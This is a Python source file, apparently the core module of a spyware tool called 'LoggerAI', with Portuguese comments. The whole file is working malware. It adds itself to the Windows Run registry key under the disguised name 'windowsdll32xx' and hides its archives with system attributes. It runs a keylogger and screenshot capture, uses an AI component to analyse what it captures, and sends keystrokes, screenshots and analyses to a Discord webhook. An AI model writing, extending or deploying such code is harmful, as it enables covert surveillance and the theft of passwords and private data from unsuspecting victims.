"""Módulo que define o fluxo de execução do programa"""

import os
import subprocess
import sys
import threading
import zipfile
from datetime import datetime
import time
import winreg
import win32con
from LoggerAI.agents.exporter import convert_pdf
from LoggerAI.agents.analyzer import analyze_logs
from LoggerAI.keylogger import Keylogger
from LoggerAI.spy import Spy
from LoggerAI.webhook_sender import WebhookSender


class Core:
    """"Classe principal, incializa o keylogger, o spy e o webhook"""

    def __init__(self):
        self.keylogger = Keylogger()
        self.spy = Spy()
        self.webhook = WebhookSender(os.getenv("DISCORD_WEBHOOK"))

    def autorun(self, exe_path):
        """"Função responsável pela persistência, insere o programa no caminho da chave de registro para incialização com o sistema"""
        try:
            if not exe_path:
                raise ValueError("The path was not found")
            key = winreg.HKEY_CURRENT_USER
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            program_name = "windowsdll32xx"
            reg_key = winreg.OpenKey(key, reg_path, 0, win32con.KEY_WRITE)
            winreg.SetValueEx(reg_key, program_name, 0,
                              win32con.REG_SZ, f'"{exe_path}"')
            winreg.CloseKey(reg_key)
        except Exception as e:
            print(f"[Autorun Error] {e}")

    def zip_files(self, zip_filename, files_to_add):
        """"Função para empacotar os arquivos antes de enviar"""
        try:
            with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
                for filename, content in files_to_add.items():
                    zipf.writestr(filename, content)
            subprocess.call(["attrib", "+h", "+s", zip_filename])

        except Exception as e:
            print(f"[Zip Error] {e}")

    def send_spy(self, interval=60, interval_seconds=1):
        """Função de envio das capturas de tela"""
        while True:
            try:
                zip_imgs_path = self.spy.main(
                    duration=interval, interval_seconds=interval_seconds)
                self.webhook.send_file(
                    zip_imgs_path, "\n📸 Screenshots obtidas:"
                )
                os.remove(zip_imgs_path)
            except Exception as e:
                print(f"[Spy Error] {e}")

    def send_keylogger(self, interval=60):
        """"Função de envio dos logs capturados, envia tanto os logs brutos, quanto os analisados pela IA"""
        while True:
            try:
                logs = self.keylogger.main(duration=interval)
                if not logs:
                    continue

                timestamp = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
                log_text = "\n".join(logs)
                raw_logs_filename = f"raw_logs_{timestamp}.txt"

                raw_zip_filename = f"raw_logs_{timestamp}.zip"
                self.zip_files(raw_zip_filename, {raw_logs_filename: log_text})
                self.webhook.send_file(
                    raw_zip_filename, "Logs brutos capturados:")
                os.remove(raw_zip_filename)

                analysis_text = analyze_logs(logs)
                pdf_content = convert_pdf(analysis_text)

                analysis_txt_filename = f"analyzed_log_{timestamp}.txt"
                analysis_pdf_filename = f"analyzed_log_{timestamp}.pdf"
                package_zip_filename = f"AI_analyzed_data_{timestamp}.zip"

                files_for_package = {
                    analysis_txt_filename: analysis_text,
                    analysis_pdf_filename: pdf_content,
                }

                self.zip_files(package_zip_filename, files_for_package)

                self.webhook.send_file(
                    package_zip_filename, "Pacote com logs analisados e convertidos pela IA.")
                os.remove(package_zip_filename)

                self.keylogger.key_log = {}

            except Exception as e:
                print(f"[Keylogger Analysis Error] {e}")

    def main(self):
        """Função main, define as threads e pega o caminho do programa para a função autorun"""
        exe_path = os.path.abspath(sys.executable)

        self.autorun(exe_path)

        t1 = threading.Thread(target=self.send_keylogger)
        t2 = threading.Thread(target=self.send_spy)
        t1.start()
        t2.start()

        while True:
            time.sleep(0.5)
